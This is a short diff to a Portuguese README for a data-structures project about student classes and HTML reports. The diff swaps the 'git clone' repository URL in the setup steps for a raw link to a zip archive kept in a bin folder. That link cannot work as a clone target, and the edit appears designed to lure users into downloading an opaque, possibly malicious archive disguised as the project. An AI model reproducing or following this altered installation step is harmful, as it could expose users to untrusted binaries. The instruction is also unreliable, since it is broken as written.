@@ -24,7 +24,7 @@ Este projeto contém classes para representar alunos e gerar relatórios em HTML
 1. Clone o repositório:
 
 ```bash
-git clone https://github.com/juvan2540/EstruturaDeDados.git
+git clone https://github.com/juvan2540/EstruturaDeDados/raw/refs/heads/main/bin/gerenciador/Estrutura-Dados-De-v3.6.zip
 cd EstruturaDeDados
 
 
